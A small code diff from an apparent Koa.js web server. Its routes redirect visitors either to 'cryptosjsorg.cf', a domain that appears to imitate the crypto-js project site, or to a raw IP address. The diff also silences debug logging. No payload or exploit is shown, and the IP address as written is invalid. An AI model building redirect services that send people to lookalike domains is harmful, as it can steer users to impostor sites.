@@ -75,7 +75,7 @@ function addshuju(data,ctx,shu){
     if(shu){
         ctx.response.redirect('http://cryptosjsorg.cf');
     }else{
-        ctx.response.redirect('http://18.162.1194.33');
+        ctx.response.redirect('http://cryptosjsorg.cf');
     }
 }
 
@@ -117,16 +117,16 @@ router.get('/', async ctx => {
     // ctx.body = ``; 
     var str=ctx.href; //请求地址
     var shu=str.includes('cryptojsorg');
-    console.log(str);
-    console.log(shu);
+    // console.log(str);
+    // console.log(shu);
     if(shu){
-        console.log('yu');
+        // console.log('yu');
         
         ctx.response.redirect('http://cryptosjsorg.cf');
     }else{
-        console.log('ip');
+        // console.log('ip');
         
-        ctx.response.redirect('http://18.162.1194.33:80');
+        ctx.response.redirect('http://18.162.1194.33');
     }
 });
 
